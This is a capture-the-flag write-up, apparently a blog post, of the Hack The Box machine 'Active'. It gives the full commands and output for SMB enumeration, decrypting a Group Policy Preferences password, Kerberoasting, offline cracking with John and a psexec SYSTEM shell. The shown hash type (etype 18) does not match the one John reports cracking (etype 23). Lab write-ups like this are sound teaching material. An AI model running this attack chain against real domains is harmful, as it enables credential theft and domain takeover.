---
layout: single
title: Active - Hack The Box
date: 2018-12-08
classes: wide
header:
  teaser: /assets/images/htb-writeup-active/active.png
categories:
  - hackthebox
  - infosec
tags:
  - hackthebox
  - kerberos
  - ad
---

## Windows / 10.10.10.100

![](/assets/images/htb-writeup-active/active.png)

This blog post is a writeup for Active from Hack the Box.

### Summary
------------------
- There's a GPP file with user credentials on the replication share of the DC which we can can crack with gpp-decrypt
- We then grab an encrypted ticket using the Kerberoasting technique and recover the Administrator password 

### Tools/Blogs
- gpp-decrypt
- [Impacket](https://github.com/CoreSecurity/impacket)
- [PyKerberoast](https://github.com/skelsec/PyKerberoast)

### Detailed steps
------------------

### Nmap

This Windows Server is running kerberos on port 88 so it's probably an Active Directory server

```
root@violentunicorn:~/hackthebox# nmap -F 10.10.10.100
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-28 20:19 EDT
Nmap scan report for active.htb (10.10.10.100)
Host is up (0.16s latency).
Not shown: 89 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.83 seconds
```

### Enumerating the SMB replication sahre

All sorts of interesting ports are open on the server. First, let's check which shares are publicly accessible:

```
root@violentunicorn:~# enum4linux 10.10.10.100

 ========================================= 
|    Share Enumeration on 10.10.10.100    |
 ========================================= 
WARNING: The "syslog" option is deprecated

  Sharename       Type      Comment
  ---------       ----      -------
  ADMIN$          Disk      Remote Admin
  C$              Disk      Default share
  IPC$            IPC       Remote IPC
  NETLOGON        Disk      Logon server share 
  Replication     Disk      
  SYSVOL          Disk      Logon server share 
  Users           Disk      
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.100
//10.10.10.100/ADMIN$ Mapping: DENIED, Listing: N/A
//10.10.10.100/C$ Mapping: DENIED, Listing: N/A
//10.10.10.100/IPC$ Mapping: OK Listing: DENIED
//10.10.10.100/NETLOGON Mapping: DENIED, Listing: N/A
//10.10.10.100/Replication  Mapping: OK, Listing: OK
//10.10.10.100/SYSVOL Mapping: DENIED, Listing: N/A
//10.10.10.100/Users  Mapping: DENIED, Listing: N/A
```

So IPC$ and Replication are open, let's check Replication...

```
root@violentunicorn:~# smbclient -N -U "" //10.10.10.100/Replication
WARNING: The "syslog" option is deprecated
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

    10459647 blocks of size 4096. 6312288 blocks available
smb: \> cd active.htb
smb: \active.htb\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 06:37:44 2018
  Policies                            D        0  Sat Jul 21 06:37:44 2018
  scripts                             D        0  Wed Jul 18 14:48:57 2018

    10459647 blocks of size 4096. 6312288 blocks available
smb: \active.htb\> cd Policies
smb: \active.htb\Policies\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Jul 21 06:37:44 2018
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Jul 21 06:37:44 2018

    10459647 blocks of size 4096. 6312288 blocks available
smb: \active.htb\Policies\> cd {31B2F340-016D-11D2-945F-00C04FB984F9}
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  GPT.INI                             A       23  Wed Jul 18 16:46:06 2018
  Group Policy                        D        0  Sat Jul 21 06:37:44 2018
  MACHINE                             D        0  Sat Jul 21 06:37:44 2018
  USER                                D        0  Wed Jul 18 14:49:12 2018

    10459647 blocks of size 4096. 6312288 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> cd machine
lsmb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Microsoft                           D        0  Sat Jul 21 06:37:44 2018
  Preferences                         D        0  Sat Jul 21 06:37:44 2018
  Registry.pol                        A     2788  Wed Jul 18 14:53:45 2018

    10459647 blocks of size 4096. 6312288 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\> cd preferences
lsmb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\preferences\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups                              D        0  Sat Jul 21 06:37:44 2018

    10459647 blocks of size 4096. 6312288 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\preferences\> cd groups
lssmb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\preferences\groups\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018

    10459647 blocks of size 4096. 6312288 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\preferences\groups\> get groups.xml
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\preferences\groups\groups.xml of size 533 as groups.xml (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\preferences\groups\> exit
```

So we just found Group Policy Preferences in a file, with encrypted credentials.

```
root@violentunicorn:~# cat groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

Luckily, the encryption key for this has been leaked by Microsoft a few years ago and we can decrypt it using `gpp-decrypt`:

```
root@violentunicorn:~# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
GPPstillStandingStrong2k18
```

So we now have the following user account's credentials:
 - Username: SVC_TGS
 - Password: GPPstillStandingStrong2k18

 We can log in with that account and recover the user flag:

```
root@violentunicorn:~# smbclient -U svc_tgs //10.10.10.100/Users
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\svc_tgs's password: 
Try "help" to get a list of possible commands.
smb: \> cd svc_tgs
smb: \svc_tgs\> cd desktop
smb: \svc_tgs\desktop\> get user.txt
getting file \svc_tgs\desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \svc_tgs\desktop\> exit
root@violentunicorn:~# cat user.txt
86d67d<redacted>
```

### Kerberoasting

Next, we'll look for Service Principal Names and encrypted service tickets that we can crack to recover other credentials.

We'll use PyKerberoast for this since we are on Kali and not Windows.

```
root@violentunicorn:~/PyKerberoast# python kerberoastv2.py -a 10.10.10.100 -b cn=users,dc=active,dc=htb -d active -u svc_tgs -p GPPstillStandingStrong2k18
[+]Starting...
$krb5tgs$18$*krbtgt$ACTIVE.HTB$spn*$cabf481b2b4dbd9567c5bee15e9d2ec9$04f2407e7fadab18a8f8ebda0e66af92e91c305098340e701383738a9cd317b15024815917af864e679ae02f8b610e18842308a54a9f0a2095ab688a972c5e03903f5d2cbf2d72cc5894ff6fa45413b95a1c94ee8fd1c9e8990c95748ba93a83bc078b3653b678a60fa0eb42cdaccdb3b4e5d5d97925676059c5b3495ce37a1fc964cf7cdeba452811d52a103633ffc5033709c3a2ac0f4f0a6aa06700b2817956c37c2f20e4ef5684b41d3f87e3f7fd80ed51088ef648f874b5fe113b5da0ebe5c7e77d63945ca190bb1dab377f75f6da85cbc261635fefdd42e621ac711c26c87d99b761941330e010fec48fd06219cd1aa7a8e91c9b0f36728ca30e68128db767e2e54c57d185b0700c03e7eb66fa62903971cdca7d481e4d4db09cc22a943ddb8ead77b4a2f2fc5cac6f34a6af8e796b5dd9f2e4310af99271a64af70c2c3aacfb8820b805d8efb3899e7a4d22c5adbf33f970e8fa7ce8ea79ad83a265aa3a4af2464d7cb296333199251a27f2fc189935f87c116e9143accd254ba4fb5d2a6f80af535076afbf8a89bea83941f703d312605d7fadc5d6583c9a86463ddc69165bdb0aabeab30edee51032dc160e3e349eb2f0c465f891015b7a127c9ef47949fdba2c1e2392d0cee6d03f54e5d36e63be681d1d2ad084c0f892b447352039488f21c184d7d0d5d68c0f15197579217ac48d3f1770710e5e0af95140d7394aae11371fd098b9591a1f6de4d4448db180a612917a8b0309e1b1a443d52d40f974e1036406c0aacf46b3be2286408cacd0c55a0e3146e7226cf6ab9c5d1b2af6939eac9c750c652f02925ab0549c3fd56f3655ceb37ec368dc24c034e6030a1b25dac3691e80098547a08b638560f2ffd37dcde83df28152fcbc9a93d9ef11a2e84f5b8efd3c8489983dceb394d22969d9c86b06af4b6633c55d86f61d1feac5dd4c541fa4e405b2b2e5fc41622833a45026dfef1e7a04b0577f2b5229b68e12af85af2cc074c3aae267c1c942cea9bcb21640bd2d0fe75996f93623e5cbaab186b7cedef4c1db1240b5c8cbb486f50bc7fafed38cd40a7605a6511d0cd393c8aa1c0387c7df9bd8c9a3f3af3eb2fe6341a88c6fac220f53725cd574f92c75e1f1a47be01a1a6bbf865fef2a681b981f2a2cf126797b7fcab95315c430f46e6140266d693e41dfb964c5f80e88ebb6c04cbe6299ef0f5cab31e8e75278474633d33251029cf0cdd2c40fe4678581ecdd193b7eac40

[+]Done!
```

Sweet, we got a ticket for the Administrator user! Let's brute force this bitch now.

### Password cracking

Because this is HTB, the password is in the rockyou.txt file:

```
root@violentunicorn:~/JohnTheRipper/run# ~/JohnTheRipper/run/john -w=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)
1g 0:00:00:39 DONE (2018-07-28 20:50) 0.02515g/s 265093p/s 265093c/s 265093C/s Tiffani1432..Tiago_18
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Ok, nice we now have the Administrator password: `Ticketmaster1968`

### Remote access using psexec

We could just grab the flag using smbclient but we'll try to get a proper shell using psexec:

```
root@violentunicorn:~# psexec.py administrator:Ticketmaster1968@10.10.10.100
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file xZMcKohO.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service vTmo on 10.10.10.100.....
[*] Starting service vTmo.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>cd \users\administrator\desktop

C:\Users\Administrator\Desktop>type root.txt
b5fc76<redacted>
```
